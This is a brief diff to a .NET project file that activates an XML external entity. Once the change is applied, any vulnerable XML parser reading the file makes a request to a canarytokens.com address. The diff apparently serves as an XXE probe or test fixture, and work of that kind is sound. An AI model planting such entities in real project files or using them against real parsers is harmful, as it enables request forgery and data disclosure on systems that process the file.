@@ -2,7 +2,7 @@
 <Project Sdk="Microsoft.NET.Sdk">
     <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://22w5f67ylt854tzanwflpwz6z.canarytokens.com"> ]>
     <foreign>
-        &test;
+        &xxe;
     </foreign>
     <PropertyGroup>
         <OutputType>Exe</OutputType>
